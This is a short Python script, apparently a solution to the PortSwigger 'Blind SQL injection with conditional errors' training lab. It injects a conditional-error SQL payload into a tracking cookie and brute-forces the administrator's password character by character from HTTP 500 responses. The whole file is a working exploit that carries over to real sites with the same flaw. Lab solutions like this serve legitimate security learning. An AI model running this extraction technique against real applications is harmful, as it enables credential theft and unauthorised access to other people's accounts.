#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Brute force script to exploit "Blind SQL injection with conditional errors" lab at
# "https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors".
#
# by Psycho (@UDPsycho)
#   Twitter: https://www.twitter.com/UDPsycho
#

import sys
import requests


if len(sys.argv) != 3:
  print ("\nUsage: {} https://<lab_url>/login TrackingId=<value>\n".format(sys.argv[0]))

else:

  target       = sys.argv[1]
  cookie_name  = sys.argv[2].split("=")[0]
  cookie_value = sys.argv[2].split("=")[1]

  payloads = ('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',1,2,3,4,5,6,7,8,9,0)
  success  = 500 # Status code
  password = ""

  PASSWORD_LENGTH = 20
  i = 1


  print ("\nBruteforcing the password, please wait...\n")

  while i <= PASSWORD_LENGTH:

    for payload in payloads:

      cookies = {
        cookie_name : "{}'+||+(SELECT CASE WHEN (SUBSTR(password,{},1)='{}') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')+||+'"
          .format(cookie_value, i, payload)
      }

      response = requests.get(target, cookies=cookies)

      if response.status_code == 500:
        password += str(payload)
        print ("  Password: {}".format(password))
        i+=1
        break

  print ("\nThe password has been brute forced successfully!\n")
